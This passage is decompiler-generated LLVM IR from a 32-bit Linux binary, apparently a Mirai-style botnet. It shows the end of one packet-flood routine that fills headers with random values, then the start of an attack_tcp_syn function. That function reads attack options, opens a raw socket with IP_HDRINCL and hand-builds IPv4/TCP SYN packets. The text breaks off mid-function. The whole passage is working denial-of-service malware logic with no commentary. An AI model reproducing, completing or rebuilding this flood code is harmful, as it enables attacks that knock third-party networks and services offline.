  store i32 %v5_804bd0a, i32* @esi, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_804bd17 = add i32 %v5_804bd0a, 20
  store i32 %v1_804bd17, i32* @edi, align 4
  %v2_804bd1a = mul i32 %v0_804bd2a, 24
  %v3_804bd1a = add i32 %v2_804bd1a, %arg3
  store i32 %v3_804bd1a, i32* %eax.global-to-local, align 4
  %v1_804bd1d = add i32 %v3_804bd1a, 20
  %v2_804bd1d = inttoptr i32 %v1_804bd1d to i8*
  %v3_804bd1d = load i8, i8* %v2_804bd1d, align 1
  %v6_804bd21 = icmp ugt i8 %v3_804bd1d, 31
  br i1 %v6_804bd21, label %dec_label_pc_804bc30, label %dec_label_pc_804bd27

dec_label_pc_804bd27:                             ; preds = %dec_label_pc_804bd06
  %v1_804bd27 = add i32 %v3_804bd1a, 16
  %v2_804bd27 = inttoptr i32 %v1_804bd27 to i32*
  %v3_804bd27 = load i32, i32* %v2_804bd27, align 4
  %v1_804bd2a = call i32 @rand_next(i32 %v0_804bd2a)
  store i32 %v1_804bd2a, i32* %eax.global-to-local, align 4
  %v1_804bd2f = trunc i32 %v3_804bd27 to i16
  %v2_804bd2f = call i16 @llvm.bswap.i16(i16 %v1_804bd2f)
  %v3_804bd2f = zext i16 %v2_804bd2f to i32
  %v1_804bd33 = udiv i32 %v3_804bd27, 65536
  %v2_804bd33 = mul nuw i32 %v3_804bd2f, 65536
  %v1_804bd36 = trunc i32 %v1_804bd33 to i16
  %v2_804bd36 = call i16 @llvm.bswap.i16(i16 %v1_804bd36)
  %v3_804bd36 = zext i16 %v2_804bd36 to i32
  %v6_804bd36 = or i32 %v3_804bd36, %v2_804bd33
  %v3_804bd3a = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804bd48 = mul i32 %v3_804bd3a, 24
  %v4_804bd48 = add i32 %v3_804bd48, %v2_804bd48
  %v5_804bd48 = inttoptr i32 %v4_804bd48 to i8*
  %v6_804bd48 = load i8, i8* %v5_804bd48, align 1
  %tmp92 = urem i8 %v6_804bd48, 32
  %v4_804bd52 = icmp eq i8 %tmp92, 0
  br i1 %v4_804bd52, label %bb91, label %bb

bb:                                               ; preds = %dec_label_pc_804bd27
  %v2_804bd52 = zext i8 %tmp92 to i32
  %v5_804bd52 = lshr i32 %v1_804bd2a, %v2_804bd52
  store i32 %v5_804bd52, i32* %eax.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_804bd27, %bb
  %v1_804bd54 = phi i32 [ %v1_804bd2a, %dec_label_pc_804bd27 ], [ %v5_804bd52, %bb ]
  %v2_804bd54 = add i32 %v1_804bd54, %v6_804bd36
  %v1_804bd56 = trunc i32 %v2_804bd54 to i16
  %v2_804bd56 = call i16 @llvm.bswap.i16(i16 %v1_804bd56)
  %v3_804bd56 = zext i16 %v2_804bd56 to i32
  %v1_804bd5a = udiv i32 %v2_804bd54, 65536
  %v2_804bd5a = mul nuw i32 %v3_804bd56, 65536
  %v1_804bd5d = trunc i32 %v1_804bd5a to i16
  %v2_804bd5d = call i16 @llvm.bswap.i16(i16 %v1_804bd5d)
  %v3_804bd5d = zext i16 %v2_804bd5d to i32
  %v6_804bd5d = or i32 %v3_804bd5d, %v2_804bd5a
  store i32 %v6_804bd5d, i32* @ebx, align 4
  %v1_804bd66 = load i32, i32* @esi, align 4
  %v2_804bd66 = add i32 %v1_804bd66, 16
  %v3_804bd66 = inttoptr i32 %v2_804bd66 to i32*
  store i32 %v6_804bd5d, i32* %v3_804bd66, align 4
  br i1 %v1_804bd69, label %dec_label_pc_804bc3b, label %.dec_label_pc_804bd70_crit_edge

.dec_label_pc_804bd70_crit_edge:                  ; preds = %bb91
  %v0_804bd70.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804bd70

dec_label_pc_804bd70:                             ; preds = %.dec_label_pc_804bd70_crit_edge, %dec_label_pc_804bc30
  %v0_804bd70 = phi i32 [ %v0_804bd70.pre, %.dec_label_pc_804bd70_crit_edge ], [ %v0_804bd2a, %dec_label_pc_804bc30 ]
  %v1_804bd70 = call i32 @rand_next(i32 %v0_804bd70)
  store i32 %v1_804bd70, i32* %eax.global-to-local, align 4
  %v1_804bd7b = load i32, i32* @esi, align 4
  %v2_804bd7b = add i32 %v1_804bd7b, 12
  %v3_804bd7b = inttoptr i32 %v2_804bd7b to i32*
  store i32 %v1_804bd70, i32* %v3_804bd7b, align 4
  br i1 %v1_804bd7e, label %dec_label_pc_804bc47, label %dec_label_pc_804bd84

dec_label_pc_804bd84:                             ; preds = %dec_label_pc_804bd70, %dec_label_pc_804bc3b
  %v0_804bd84 = load i32, i32* %stack_var_-20, align 4
  %v1_804bd84 = call i32 @rand_next(i32 %v0_804bd84)
  store i32 %v1_804bd84, i32* %eax.global-to-local, align 4
  %v1_804bd8f = trunc i32 %v1_804bd84 to i16
  %v2_804bd8f = load i32, i32* @esi, align 4
  %v3_804bd8f = add i32 %v2_804bd8f, 4
  %v4_804bd8f = inttoptr i32 %v3_804bd8f to i16*
  store i16 %v1_804bd8f, i16* %v4_804bd8f, align 2
  br i1 %v1_804bd93, label %dec_label_pc_804bc53, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd84, %dec_label_pc_804bc47
  %v0_804bda0 = load i32, i32* %stack_var_-20, align 4
  %v1_804bda0 = call i32 @rand_next(i32 %v0_804bda0)
  store i32 %v1_804bda0, i32* %eax.global-to-local, align 4
  %v0_804bda5 = load i32, i32* @ebp, align 4
  %v1_804bda5 = trunc i32 %v0_804bda5 to i16
  %v11_804bda5 = icmp eq i16 %v1_804bda5, -1
  %v1_804bda9 = trunc i32 %v1_804bda0 to i16
  %v2_804bda9 = load i32, i32* @esi, align 4
  %v3_804bda9 = add i32 %v2_804bda9, 20
  %v4_804bda9 = inttoptr i32 %v3_804bda9 to i16*
  store i16 %v1_804bda9, i16* %v4_804bda9, align 2
  %v1_804bdad = icmp eq i1 %v11_804bda5, false
  br i1 %v1_804bdad, label %dec_label_pc_804bc5d, label %dec_label_pc_804bdb3

dec_label_pc_804bdb3:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bc53
  %v0_804bdb3 = load i32, i32* %stack_var_-20, align 4
  %v1_804bdb3 = call i32 @rand_next(i32 %v0_804bdb3)
  store i32 %v1_804bdb3, i32* %eax.global-to-local, align 4
  %v1_804bdc0 = trunc i32 %v1_804bdb3 to i16
  %v2_804bdc0 = load i32, i32* @edi, align 4
  %v3_804bdc0 = add i32 %v2_804bdc0, 2
  %v4_804bdc0 = inttoptr i32 %v3_804bdc0 to i16*
  store i16 %v1_804bdc0, i16* %v4_804bdc0, align 2
  br i1 %v1_804bdc4, label %dec_label_pc_804bc6b, label %dec_label_pc_804bdd0

dec_label_pc_804bdd0:                             ; preds = %dec_label_pc_804bdb3, %dec_label_pc_804bc5d
  %v0_804bdd0 = load i32, i32* %stack_var_-20, align 4
  %v1_804bdd0 = call i32 @rand_next(i32 %v0_804bdd0)
  store i32 %v1_804bdd0, i32* %eax.global-to-local, align 4
  %v1_804bddd = load i32, i32* @edi, align 4
  %v2_804bddd = add i32 %v1_804bddd, 4
  %v3_804bddd = inttoptr i32 %v2_804bddd to i32*
  store i32 %v1_804bdd0, i32* %v3_804bddd, align 4
  br i1 %v1_804bde0, label %dec_label_pc_804bc79, label %dec_label_pc_804bde6

dec_label_pc_804bde6:                             ; preds = %dec_label_pc_804bdd0, %dec_label_pc_804bc6b
  %v0_804bde6 = load i32, i32* %stack_var_-20, align 4
  %v1_804bde6 = call i32 @rand_next(i32 %v0_804bde6)
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v1_804bdf0 = load i32, i32* @edi, align 4
  %v2_804bdf0 = add i32 %v1_804bdf0, 8
  %v3_804bdf0 = inttoptr i32 %v2_804bdf0 to i32*
  store i32 %v1_804bde6, i32* %v3_804bdf0, align 4
  br i1 %v4_804bc79, label %dec_label_pc_804bc84, label %dec_label_pc_804be00

dec_label_pc_804be00:                             ; preds = %dec_label_pc_804bde6, %dec_label_pc_804bc79
  store i32 %v5_804b9a3, i32* %edx.global-to-local, align 4
  %v0_804be06 = load i32, i32* @esi, align 4
  %v1_804be06 = add i32 %v0_804be06, 40
  store i32 %v1_804be06, i32* %eax.global-to-local, align 4
  store i32 %v1_804be06, i32* %stack_var_-156, align 4
  %v2_804be0b = inttoptr i32 %v1_804be06 to i8*
  %v3_804be0b = call i32 @rand_alphastr(i8* %v2_804be0b, i32 %v5_804b9a3)
  store i32 %v5_804b9a3, i32* %eax.global-to-local, align 4
  %v1_804be17 = load i32, i32* @esi, align 4
  %v3_804be17 = add i32 %v1_804be17, %.pre30
  %v4_804be17 = inttoptr i32 %v3_804be17 to i8*
  store i8 0, i8* %v4_804be17, align 1
  br label %dec_label_pc_804bc84

dec_label_pc_804be21:                             ; preds = %dec_label_pc_804bc84, %dec_label_pc_804bbff
  store i32 0, i32* %stack_var_-156, align 4
  %v2_804be26 = call i32 @__GI_time(i32* null)
  store i32 %v2_804be26, i32* %eax.global-to-local, align 4
  %v5_804be32 = icmp slt i32 %v2_804b9e3, %v2_804be26
  br i1 %v5_804be32, label %dec_label_pc_804be38, label %dec_label_pc_804bbff

dec_label_pc_804be38:                             ; preds = %dec_label_pc_804be21, %entry
  %v0_804be3f = phi i32 [ 0, %entry ], [ %v2_804be26, %dec_label_pc_804be21 ]
  store i32 %v0_804b862, i32* %esi.global-to-local, align 4
  ret i32 %v0_804be3f

dec_label_pc_804be40:                             ; preds = %dec_label_pc_804ba05
  store i32 %v3_804b9f2, i32* @eax, align 4
  store i32 %v3_804b9f2, i32* %stack_var_-156, align 4
  %v1_804be48 = call i32 @__GI___libc_close(i32 %v3_804b9f2)
  store i32 %v1_804be48, i32* %eax.global-to-local, align 4
  store i32 %v0_804b862, i32* %esi.global-to-local, align 4
  ret i32 %v1_804be48

; uselistorder directives
  uselistorder i8 %tmp92, { 1, 0 }
  uselistorder i32 %v0_804bd2a, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804bcf1, { 1, 0, 2, 3 }
  uselistorder i1 %v12_804bdd5, { 1, 0 }
  uselistorder i1 %v13_804bd75, { 1, 0 }
  uselistorder i32 %v1_804bba3, { 1, 0 }
  uselistorder i32 %v2_804bb95, { 1, 0 }
  uselistorder i32 %v2_804bb8a, { 1, 0 }
  uselistorder i32 %v2_804bb7b, { 1, 0 }
  uselistorder i32 %v0_804bae7, { 1, 0, 2 }
  uselistorder i32 %.pre30, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_804ba32, { 1, 0 }
  uselistorder i32 %v3_804b9f2, { 4, 3, 2, 1, 0, 6, 5, 7 }
  uselistorder i32 %v5_804b9b5, { 1, 0 }
  uselistorder i32 %v5_804b9a3, { 4, 6, 5, 7, 2, 1, 3, 0, 8 }
  uselistorder i32 %v5_804b960, { 0, 2, 1 }
  uselistorder i32 %v5_804b8f6, { 0, 2, 1 }
  uselistorder i32 %v5_804b8e4, { 1, 0 }
  uselistorder i32 %v5_804b8d2, { 1, 0, 2 }
  uselistorder i32 %v5_804b8c3, { 0, 2, 1 }
  uselistorder i32 %v5_804b8ae, { 1, 0 }
  uselistorder i32 %v3_804b89f, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32 %v4_804b86c, { 2, 3, 1, 4, 0 }
  uselistorder i32 %v0_804b862, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-20, { 5, 1, 3, 2, 4, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 17, 18, 11, 12, 13, 14, 15, 19, 20, 21, 26, 22, 23, 24, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 %arg3, { 7, 0, 6, 1, 5, 2, 8, 3, 4 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_804bc84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bbb7, { 1, 0 }
  uselistorder label %dec_label_pc_804bb24, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804be63 = load i32, i32* @ebx, align 4
  %v4_804be69 = zext i8 %arg2 to i32
  %v5_804be69 = load i32, i32* @eax, align 4
  %v6_804be69 = and i32 %v5_804be69, -256
  %v7_804be69 = or i32 %v6_804be69, %v4_804be69
  store i32 %v7_804be69, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804be69, i32* %edx.global-to-local, align 4
  %v4_804be79 = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804be79, i32* @ebx, align 4
  store i32 %v4_804be69, i32* %stack_var_-140, align 4
  %v2_804be99 = zext i8 %arg2 to i64
  %v3_804be99 = call i32 @calloc(i64 %v2_804be99, i32 4)
  store i32 %v3_804be99, i32* @eax, align 4
  %v0_804bea6 = load i32, i32* @esi, align 4
  %v0_804bea7 = load i32, i32* @ebx, align 4
  %v4_804bea8 = trunc i32 %v0_804bea7 to i8
  %v5_804bea8 = call i32 @attack_get_opt_int(i8 %v4_804bea8, i32 %v0_804bea6, i32 2, i32 0)
  store i32 %v5_804bea8, i32* @eax, align 4
  %v0_804bebb = load i32, i32* @esi, align 4
  %v0_804bebc = load i32, i32* @ebx, align 4
  store i32 %v0_804bebc, i32* %stack_var_-140, align 4
  %v4_804bebd = trunc i32 %v0_804bebc to i8
  %v5_804bebd = call i32 @attack_get_opt_int(i8 %v4_804bebd, i32 %v0_804bebb, i32 3, i32 65535)
  %v6_804bebd = trunc i32 %v5_804bebd to i16
  store i32 %v5_804bebd, i32* @eax, align 4
  %v0_804beca = load i32, i32* @esi, align 4
  %v0_804becb = load i32, i32* @ebx, align 4
  %v4_804becc = trunc i32 %v0_804becb to i8
  %v5_804becc = call i32 @attack_get_opt_int(i8 %v4_804becc, i32 %v0_804beca, i32 4, i32 64)
  store i32 %v5_804becc, i32* @eax, align 4
  %v0_804bedc = load i32, i32* @esi, align 4
  %v0_804bedd = load i32, i32* @ebx, align 4
  store i32 %v0_804bedd, i32* %stack_var_-140, align 4
  %v4_804bede = trunc i32 %v0_804bedd to i8
  %v5_804bede = call i32 @attack_get_opt_int(i8 %v4_804bede, i32 %v0_804bedc, i32 5, i32 1)
  %v6_804bede = trunc i32 %v5_804bede to i8
  store i32 %v5_804bede, i32* @eax, align 4
  %v0_804beee = load i32, i32* @esi, align 4
  %v0_804beef = load i32, i32* @ebx, align 4
  %v4_804bef0 = trunc i32 %v0_804beef to i8
  %v5_804bef0 = call i32 @attack_get_opt_int(i8 %v4_804bef0, i32 %v0_804beee, i32 6, i32 65535)
  %v6_804bef0 = trunc i32 %v5_804bef0 to i16
  store i32 %v5_804bef0, i32* @eax, align 4
  %v0_804bf03 = load i32, i32* @esi, align 4
  %v0_804bf04 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf04, i32* %stack_var_-140, align 4
  %v4_804bf05 = trunc i32 %v0_804bf04 to i8
  %v5_804bf05 = call i32 @attack_get_opt_int(i8 %v4_804bf05, i32 %v0_804bf03, i32 7, i32 65535)
  store i32 %v5_804bf05, i32* @eax, align 4
  %sext = mul i32 %v5_804bf05, 65536
  %v1_804bf0f = sdiv i32 %sext, 65536
  store i32 %v1_804bf0f, i32* @ebp, align 4
  %v0_804bf13 = load i32, i32* @esi, align 4
  %v0_804bf14 = load i32, i32* @ebx, align 4
  %v4_804bf15 = trunc i32 %v0_804bf14 to i8
  %v5_804bf15 = call i32 @attack_get_opt_int(i8 %v4_804bf15, i32 %v0_804bf13, i32 16, i32 65535)
  store i32 %v5_804bf15, i32* @eax, align 4
  %v0_804bf25 = load i32, i32* @esi, align 4
  %v0_804bf26 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf26, i32* %stack_var_-140, align 4
  %v4_804bf27 = trunc i32 %v0_804bf26 to i8
  %v5_804bf27 = call i32 @attack_get_opt_int(i8 %v4_804bf27, i32 %v0_804bf25, i32 17, i32 0)
  store i32 %v5_804bf27, i32* @eax, align 4
  %v0_804bf34 = load i32, i32* @esi, align 4
  %v0_804bf35 = load i32, i32* @ebx, align 4
  %v4_804bf36 = trunc i32 %v0_804bf35 to i8
  %v5_804bf36 = call i32 @attack_get_opt_int(i8 %v4_804bf36, i32 %v0_804bf34, i32 10, i32 0)
  store i32 %v5_804bf36, i32* @eax, align 4
  %sext8 = mul i32 %v5_804bf36, 16777216
  %v1_804bf3e = sdiv i32 %sext8, 16777216
  store i32 %v1_804bf3e, i32* @edi, align 4
  %v0_804bf44 = load i32, i32* @esi, align 4
  %v0_804bf45 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf45, i32* %stack_var_-140, align 4
  %v4_804bf46 = trunc i32 %v0_804bf45 to i8
  %v5_804bf46 = call i32 @attack_get_opt_int(i8 %v4_804bf46, i32 %v0_804bf44, i32 11, i32 0)
  store i32 %v5_804bf46, i32* @eax, align 4
  %v0_804bf53 = load i32, i32* @esi, align 4
  %v0_804bf54 = load i32, i32* @ebx, align 4
  %v4_804bf55 = trunc i32 %v0_804bf54 to i8
  %v5_804bf55 = call i32 @attack_get_opt_int(i8 %v4_804bf55, i32 %v0_804bf53, i32 12, i32 0)
  store i32 %v5_804bf55, i32* @eax, align 4
  %v0_804bf65 = load i32, i32* @esi, align 4
  %v0_804bf66 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf66, i32* %stack_var_-140, align 4
  %v4_804bf67 = trunc i32 %v0_804bf66 to i8
  %v5_804bf67 = call i32 @attack_get_opt_int(i8 %v4_804bf67, i32 %v0_804bf65, i32 13, i32 0)
  store i32 %v5_804bf67, i32* @eax, align 4
  %v0_804bf74 = load i32, i32* @esi, align 4
  %v0_804bf75 = load i32, i32* @ebx, align 4
  %v4_804bf76 = trunc i32 %v0_804bf75 to i8
  %v5_804bf76 = call i32 @attack_get_opt_int(i8 %v4_804bf76, i32 %v0_804bf74, i32 14, i32 1)
  store i32 %v5_804bf76, i32* @eax, align 4
  %v0_804bf86 = load i32, i32* @esi, align 4
  %v0_804bf87 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf87, i32* %stack_var_-140, align 4
  %v4_804bf88 = trunc i32 %v0_804bf87 to i8
  %v5_804bf88 = call i32 @attack_get_opt_int(i8 %v4_804bf88, i32 %v0_804bf86, i32 15, i32 0)
  store i32 %v5_804bf88, i32* @eax, align 4
  %v0_804bf8d = load i32, i32* @global_var_805a858.27, align 8
  %v0_804bf9a = load i32, i32* @esi, align 4
  %v0_804bf9b = load i32, i32* @ebx, align 4
  %v4_804bf9c = trunc i32 %v0_804bf9b to i8
  %v5_804bf9c = call i32 @attack_get_opt_ip(i8 %v4_804bf9c, i32 %v0_804bf9a, i32 24, i32 %v0_804bf8d)
  store i32 %v5_804bf9c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804bfaa = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804bfb6 = add i32 %v2_804bfaa, %arg1
  store i32 %v2_804bfb6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v3_804bfc5 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_804bfd1 = add i32 %v3_804bfc5, 1
  %v8_804bfd1 = icmp eq i32 %v1_804bfd1, 0
  store i32 %v1_804bfd1, i32* %eax.global-to-local, align 4
  br i1 %v8_804bfd1, label %dec_label_pc_804c3c5, label %dec_label_pc_804bfd8

dec_label_pc_804bfd8:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  store i32 4, i32* %stack_var_-140, align 4
  %v2_804bfe5 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v3_804bfc5, i32* %eax.global-to-local, align 4
  %v5_804bff3 = call i32 @__GI_setsockopt(i32 %v3_804bfc5, i32 0, i32 3, i32 %v2_804bfe5, i32 4)
  %v1_804bffb = add i32 %v5_804bff3, 1
  %v8_804bffb = icmp eq i32 %v1_804bffb, 0
  store i32 %v1_804bffb, i32* %eax.global-to-local, align 4
  br i1 %v8_804bffb, label %dec_label_pc_804c3cd, label %dec_label_pc_804c002

dec_label_pc_804c002:                             ; preds = %dec_label_pc_804bfd8
  %sext10 = mul i32 %v5_804bef0, 65536
  %v4_804c006 = sdiv i32 %sext10, 65536
  store i32 %v4_804c006, i32* %edx.global-to-local, align 4
  %v0_804c00f = load i32, i32* @edi, align 4
  store i32 %v0_804c00f, i32* %eax.global-to-local, align 4
  %v1_804c016 = trunc i32 %v0_804c00f to i8
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804c022 = icmp eq i8 %arg2, 0
  br i1 %v4_804c022, label %dec_label_pc_804c3ae.critedge, label %dec_label_pc_804c02d

dec_label_pc_804c02d:                             ; preds = %dec_label_pc_804c002
  %sext9 = mul i32 %v5_804bebd, 65536
  %v4_804c002 = sdiv i32 %sext9, 65536
  %v1_804c02d = urem i32 %v0_804c00f, 2
  %v1_804c036 = urem i32 %v5_804bf46, 2
  %v1_804c041 = urem i32 %v5_804bf55, 2
  %v1_804c048 = urem i32 %v5_804bf67, 2
  %v1_804c057 = urem i32 %v5_804bf76, 2
  %v1_804c062 = urem i32 %v5_804bf88, 2
  store i32 %v1_804c062, i32* %edx.global-to-local, align 4
  %v1_804c06d = trunc i32 %v5_804bf15 to i16
  %v2_804c06d = call i16 @llvm.bswap.i16(i16 %v1_804c06d)
  %v3_804c06d = zext i16 %v2_804c06d to i32
  store i32 %v3_804c06d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %tmp = sub nsw i32 0, %v1_804c02d
  %v2_804c078 = and i32 %tmp, 32
  store i32 %v2_804c078, i32* @edi, align 4
  %v4_804c0a5 = urem i32 %v5_804bea8, 256
  %v2_804c0b6 = call i16 @llvm.bswap.i16(i16 %v6_804bebd)
  %v3_804c0b6 = zext i16 %v2_804c0b6 to i32
  %v5_804c0b6 = and i32 %v4_804c002, -65536
  %v6_804c0b6 = or i32 %v3_804c0b6, %v5_804c0b6
  %v4_804c0be = urem i32 %v5_804becc, 256
  %v4_804c0c8 = icmp eq i8 %v6_804bede, 0
  %v3_804c0ea = add i32 %arg3, 16
  %v2_804c0f5 = call i16 @llvm.bswap.i16(i16 %v6_804bef0)
  %v1_804c0c5 = trunc i32 %v5_804becc to i8
  br label %dec_label_pc_804c07f

dec_label_pc_804c07f:                             ; preds = %dec_label_pc_804c0d5.dec_label_pc_804c07f_crit_edge, %dec_label_pc_804c02d
  store i32 128, i32* %stack_var_-140, align 4
  %v3_804c088 = call i32 @calloc(i64 128, i32 1)
  %v2_804c091 = load i32, i32* @ebx, align 4
  %v3_804c091 = mul i32 %v2_804c091, 4
  %v4_804c091 = add i32 %v3_804c091, %v3_804be99
  %v5_804c091 = inttoptr i32 %v4_804c091 to i32*
  store i32 %v3_804c088, i32* %v5_804c091, align 4
  store i32 %v3_804be99, i32* %eax.global-to-local, align 4
  %v3_804c098 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c098, i32* %edx.global-to-local, align 4
  %v2_804c09c = mul i32 %v3_804c098, 4
  %v3_804c09c = add i32 %v2_804c09c, %v3_804be99
  %v4_804c09c = inttoptr i32 %v3_804c09c to i32*
  %v5_804c09c = load i32, i32* %v4_804c09c, align 4
  store i32 %v5_804c09c, i32* %ebx.global-to-local, align 4
  %v1_804c09f = inttoptr i32 %v5_804c09c to i8*
  store i8 69, i8* %v1_804c09f, align 1
  %v0_804c0a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0a2 = add i32 %v0_804c0a2, 20
  store i32 %v1_804c0a2, i32* @esi, align 4
  %v5_804c0a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804c0a5 = and i32 %v5_804c0a5, -256
  %v7_804c0a5 = or i32 %v6_804c0a5, %v4_804c0a5
  store i32 %v7_804c0a5, i32* %eax.global-to-local, align 4
  %v1_804c0a9 = add i32 %v0_804c0a2, 2
  %v2_804c0a9 = inttoptr i32 %v1_804c0a9 to i16*
  store i16 15360, i16* %v2_804c0a9, align 2
  %v0_804c0af = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0af = trunc i32 %v0_804c0af to i8
  %v2_804c0af = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c0af = add i32 %v2_804c0af, 1
  %v4_804c0af = inttoptr i32 %v3_804c0af to i8*
  store i8 %v1_804c0af, i8* %v4_804c0af, align 1
  store i32 %v6_804c0b6, i32* %eax.global-to-local, align 4
  %v2_804c0ba = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c0ba = add i32 %v2_804c0ba, 4
  %v4_804c0ba = inttoptr i32 %v3_804c0ba to i16*
  store i16 %v2_804c0b6, i16* %v4_804c0ba, align 2
  %v5_804c0be = load i32, i32* %eax.global-to-local, align 4
  %v6_804c0be = and i32 %v5_804c0be, -256
  %v7_804c0be = or i32 %v6_804c0be, %v4_804c0be
  store i32 %v7_804c0be, i32* %eax.global-to-local, align 4
  %v2_804c0c5 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c0c5 = add i32 %v2_804c0c5, 8
  %v4_804c0c5 = inttoptr i32 %v3_804c0c5 to i8*
  store i8 %v1_804c0c5, i8* %v4_804c0c5, align 1
  br i1 %v4_804c0c8, label %dec_label_pc_804c0d5, label %dec_label_pc_804c0cf

dec_label_pc_804c0cf:                             ; preds = %dec_label_pc_804c07f
  %v0_804c0cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0cf = add i32 %v0_804c0cf, 6
  %v2_804c0cf = inttoptr i32 %v1_804c0cf to i16*
  store i16 64, i16* %v2_804c0cf, align 2
  br label %dec_label_pc_804c0d5

dec_label_pc_804c0d5:                             ; preds = %dec_label_pc_804c07f, %dec_label_pc_804c0cf
  %v0_804c0d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c0d5 = add i32 %v0_804c0d5, 9
  %v2_804c0d5 = inttoptr i32 %v1_804c0d5 to i8*
  store i8 6, i8* %v2_804c0d5, align 1
  %v1_804c0dd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c0dd = add i32 %v1_804c0dd, 12
  %v3_804c0dd = inttoptr i32 %v2_804c0dd to i32*
  store i32 %v5_804bf9c, i32* %v3_804c0dd, align 4
  %v0_804c0e0 = load i32, i32* %edx.global-to-local, align 4
  %v3_804c0e0 = mul i32 %v0_804c0e0, 3
  store i32 %v3_804c0e0, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804c0ea = mul i32 %v0_804c0e0, 24
  %v4_804c0ea = add i32 %v3_804c0ea, %v2_804c0ea
  %v5_804c0ea = inttoptr i32 %v4_804c0ea to i32*
  %v6_804c0ea = load i32, i32* %v5_804c0ea, align 4
  %v1_804c0ee = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c0ee = add i32 %v1_804c0ee, 16
  %v3_804c0ee = inttoptr i32 %v2_804c0ee to i32*
  store i32 %v6_804c0ea, i32* %v3_804c0ee, align 4
  %v2_804c0f9 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c0f9 = add i32 %v2_804c0f9, 20
  %v4_804c0f9 = inttoptr i32 %v3_804c0f9 to i16*
  store i16 %v2_804c0f5, i16* %v4_804c0f9, align 2
  %v0_804c0fd = load i32, i32* @ebp, align 4
  %v1_804c0ff = trunc i32 %v0_804c0fd to i16
  %v2_804c0ff = call i16 @llvm.bswap.i16(i16 %v1_804c0ff)
  %v2_804c103 = load i32, i32* @esi, align 4
  %v3_804c103 = add i32 %v2_804c103, 2
  %v4_804c103 = inttoptr i32 %v3_804c103 to i16*
  store i16 %v2_804c0ff, i16* %v4_804c103, align 2
  store i32 %v3_804c06d, i32* %eax.global-to-local, align 4
  %v1_804c10b = load i32, i32* @esi, align 4
  %v2_804c10b = add i32 %v1_804c10b, 4
  %v3_804c10b = inttoptr i32 %v2_804c10b to i32*
  store i32 %v3_804c06d, i32* %v3_804c10b, align 4
  %v0_804c10e = load i32, i32* @esi, align 4
  %v1_804c10e = add i32 %v0_804c10e, 12
  %v2_804c10e = inttoptr i32 %v1_804c10e to i8*
  %v3_804c10e = load i8, i8* %v2_804c10e, align 1
  %tmp82 = urem i8 %v3_804c10e, 16
  %v1_804c111 = zext i8 %tmp82 to i32
  %v1_804c114 = or i32 %v1_804c111, -96
  %v2_804c114 = trunc i32 %v1_804c114 to i8
  store i32 %v1_804c114, i32* %eax.global-to-local, align 4
  store i8 %v2_804c114, i8* %v2_804c10e, align 1
  %v0_804c11a = load i32, i32* @esi, align 4
  %v1_804c11a = add i32 %v0_804c11a, 13
  %v2_804c11a = inttoptr i32 %v1_804c11a to i8*
  %v3_804c11a = load i8, i8* %v2_804c11a, align 1
